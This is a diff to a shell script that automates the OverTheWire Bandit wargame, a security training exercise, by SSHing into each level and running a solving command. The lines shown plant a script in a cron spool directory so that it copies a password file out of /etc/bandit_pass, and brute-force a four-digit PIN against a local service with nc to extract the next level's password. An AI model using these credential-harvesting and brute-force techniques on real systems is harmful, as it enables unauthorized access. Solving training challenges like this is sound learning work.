@@ -25,10 +25,11 @@ COMMANDS=(
   "cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv"
   "cat /tmp/8ca319486bfbbc3663ea0fbe81326349"
   "mkdir /tmp/bandit24-pwd/; chmod 777 /tmp/bandit24-pwd/; echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit24-pwd/password.txt' > /var/spool/bandit24/foo/copy_password.sh; chmod +x /var/spool/bandit24/foo/copy_password.sh; while [ ! -f /tmp/bandit24-pwd/password.txt ]; do sleep 1; done; cat /tmp/bandit24-pwd/password.txt"
-  "echo 'Final Level'"
+  "{ PASSWORD=\$(cat /etc/bandit_pass/bandit24); for i in {0000..9999}; do echo \"\$PASSWORD \$i\"; done; } | nc localhost 30002 | awk '/The password of user bandit25 is/ { sub(/^The password of user bandit25 is /,\"\"); print; exit }'"
+  "echo 'From this level onwards, the password has to be obtained manually.'"
 )
 
-for i in {0..24}; do
+for i in {0..25}; do
   echo -e "\e[33m[NOTE]\e[0m Connecting to \e[32mbandit$i\e[0m with password \e[31m$PASSWORD\e[0m and executing \e[34m\$(${COMMANDS[$i]})\e[0m"
   OUTPUT=$(sshpass -p "$PASSWORD" ssh -q \
     -o PreferredAuthentications=password -o PubkeyAuthentication=no \
